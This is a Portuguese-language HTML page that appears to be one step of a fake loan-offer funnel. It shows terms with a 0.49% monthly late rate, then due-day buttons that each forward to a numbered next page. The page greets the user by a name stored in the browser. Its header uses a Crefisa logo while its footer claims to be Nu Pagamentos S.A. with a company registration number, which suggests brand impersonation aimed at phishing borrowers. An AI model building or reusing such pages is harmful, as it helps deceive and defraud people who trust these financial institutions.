    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #f5f7f9;
            color: #1f2937;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Navbar */
        .navbar {
            background-color: #9903d6;
            padding: 15px 5%;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            z-index: 1000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(153, 3, 214, 0.2);
        }

        .navbar img {
            height: 35px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 100px 1rem 2rem 1rem;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }

        .card {
            max-width: 450px;
            width: 100%;
            background-color: white;
            text-align: center;
            padding: 2rem 1.5rem;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }

        .card p {
            font-size: 16px;
            line-height: 1.6;
            color: #374151;
            margin-bottom: 24px;
            text-align: left;
        }

        /* Buttons */
        .btn-custom {
            color: white;
            border: none;
            width: 100%;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #9903d6, #b347e8);
            font-weight: 600;
            border-radius: 12px;
            padding: 16px 24px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-custom:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(153, 3, 214, 0.3);
        }

        .btn-custom:active {
            transform: translateY(0);
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #1f2937;
        }

        /* Hidden sections */
        .section {
            display: none;
        }

        .section.active {
            display: block;
        }

    </style>

    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5HHS3G78"

    <!-- Navbar -->
    <nav class="navbar">
        <div><img src="images/crefisa.png" alt="Logo"></div>
        <div></div>
</nav>

    <!-- Main Content -->
    <div class="main-content">
        <div class="card">
            <!-- Seção 1: Termos -->
            <div id="analise-secao" class="section active">
                <p>Se houver atraso no pagamento das parcelas, serão aplicados juros de 0.49% ao mês.</p>
                <button class="btn-custom" onclick="mostrarPagina('vencimento-secao')">Concordo</button>
    </div>

            <!-- Seção 2: Escolha do vencimento -->
            <div id="vencimento-secao" class="section">
                <p class="section-title" id="nomeCliente">Ótimo! Agora escolha o dia do vencimento das parcelas:</p>
                <button class="btn-custom" onclick="irParaProximo()">05</button>
                <button class="btn-custom" onclick="irParaProximo()">10</button>
                <button class="btn-custom" onclick="irParaProximo()">15</button>
                <button class="btn-custom" onclick="irParaProximo()">25</button>
                <button class="btn-custom" onclick="irParaProximo()">30</button>
                </div>
            </div>
        </div>

    <!-- Footer -->
    <footer style="margin-top:0px !important; margin: 0; padding: 0; background-color: #9903d6; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 150px;">
    <div style="text-align: center;">
        <img src="images/logo.png" alt="Logo" style="width: 70px; margin-bottom: 8px;">
        <p style="margin: 0; font-size: 14px; line-height: 1.5;">© 2025 Nu Pagamentos S.A - Instituição de Pagamento.</p>
        <p style="margin: 0; font-size: 14px; line-height: 1.5;"> 18.236.120/0001-58 - São Paulo, SP - 05409-000</p>
    </div>
</footer>

    <script>
        // Carrega nome do localStorage
        document.addEventListener("DOMContentLoaded", function () {
            const nome = localStorage.getItem('nome');
            if (nome) {
                const primeiroNome = nome.split(' ')[0];
                document.getElementById('nomeCliente').textContent = primeiroNome + ', escolha o dia do vencimento das parcelas:';
            }
        });

        // Mostra/esconde seções
        function mostrarPagina(paginaId) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById(paginaId).classList.add('active');
        }

        // Ir para próxima página
        function irParaProximo() {
            window.location.href = '/13/' + window.location.search;
        }
    </script>
